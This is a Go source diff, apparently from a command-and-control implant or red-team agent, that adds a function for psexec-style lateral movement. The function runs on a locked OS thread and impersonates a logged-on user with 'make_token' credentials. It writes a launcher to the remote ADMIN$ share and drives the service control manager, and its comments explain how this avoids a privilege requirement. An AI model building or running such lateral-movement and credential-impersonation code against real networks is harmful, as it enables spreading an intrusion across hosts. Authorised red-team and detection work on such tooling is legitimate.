@@ -4,11 +4,13 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"crypto/rand"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"os"
+	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -275,4 +277,37 @@ func lateralCleanup(payload lateralCleanupPayload) (string, error) {
 		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
 	}
 	return lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
+}
+
+// lateralPsexecGoroutine runs psexec on a goroutine with a locked OS thread
+// so ImpersonateLoggedOnUser (applied by reestablishThreadToken) governs the
+// ADMIN$ write and SCM calls directly. This avoids CreateProcessAsUserW and
+// its SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement: thread impersonation with a
+// LOGON_NEW_CREDENTIALS token covers all outbound network auth without any
+// special agent privileges.
+//
+// The goroutine's thread impersonation is independent of the main goroutine's
+// thread token; the main goroutine's impersonation state is not affected.
+func lateralPsexecGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
+	type resultT struct {
+		result string
+		err    error
+	}
+	ch := make(chan resultT, 1)
+	go func() {
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		// Apply the active make_token credentials to this goroutine's OS thread.
+		// This is a no-op when no token is active, so psexec still works under
+		// the agent's own identity.
+		reestablishThreadToken()
+		result, err := lateralMove(payload)
+		ch <- resultT{result, err}
+	}()
+	select {
+	case r := <-ch:
+		return r.result, r.err
+	case <-ctx.Done():
+		return "", errors.New("lateral psexec timed out; the target may still be starting")
+	}
 }
